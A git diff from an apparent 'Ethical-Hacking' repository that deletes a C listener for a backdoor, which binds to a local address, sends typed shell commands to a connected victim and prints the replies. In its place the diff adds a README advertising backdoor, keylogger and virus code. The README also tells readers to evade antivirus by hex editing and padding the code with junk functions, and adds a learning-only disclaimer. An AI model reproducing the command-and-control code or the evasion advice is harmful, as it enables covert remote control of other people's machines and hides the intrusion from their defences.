@@ -1,60 +1,16 @@
-#include <stdio.h>
-#include <sys/types.h>	
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <winsock2.h>
-#include <windows.h>
-#include <ws2tcpip.h>	//for socklen_t
+# Ethical-Hacking
+Codes for malware, viruses and key-logger and other tools  
 
-/*#include <sys/socket.h>	for linux  
-#include <netinet/in.h>
-#include <arpa/inet.h>*/
+1. The Basic malware folder contain c code for backdoor and server file, its debian based so its recommended to use os like Kali or Ubuntu or you can convert it to windows type.
 
+2. Keylogger.h is a hearder file for you can add to your backdoor.c or any other c or cpp code.
 
-int main()
-{
-	int sock, client_socket;
-	char buffer[1024];
-	char response[18384];
-	struct sockaddr_in server_address, client_address;
-	int i=0;
-	int optval = 1;
-	socklen_t client_length;
+3. Malware folder is the c code i have developed.
 
-	sock = socket(AF_INET, SOCK_STREAM, 0);
+4. To hide your malware from being detected by Anti-Virus softwares you can use hex editor and or add various useless functions to hide actuall code.
 
-	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
-		printf("Error Setting TCP Socket Options!\n");
-		return 1;
-	}
+5. Basic virus codes in cpp language, each virus code has comments which describes what it do. 
 
-	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("192.168.1.6");
-	server_address.sin_port = htons(50005);
+NOTE: This project is created only for learning purpose.
 
-	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
-	listen(sock, 5);
-	client_length = sizeof(client_address);
-	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
-
-	while(1)
-	{
-		jump:
-		bzero(&buffer, sizeof(buffer));
-		bzero(&response, sizeof(response));
-		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
-		fgets(buffer, sizeof(buffer), stdin);
-		strtok(buffer, "\n");
-		write(client_socket, buffer, sizeof(buffer));
-		if (strncmp("q", buffer, 1) == 0) {
-			break;
-		}
-		else {
-			recv(client_socket, response, sizeof(response), MSG_WAITALL);
-			printf("%s", response);
-		}
-
-	}
-
-}
+These work mainly for windows OS
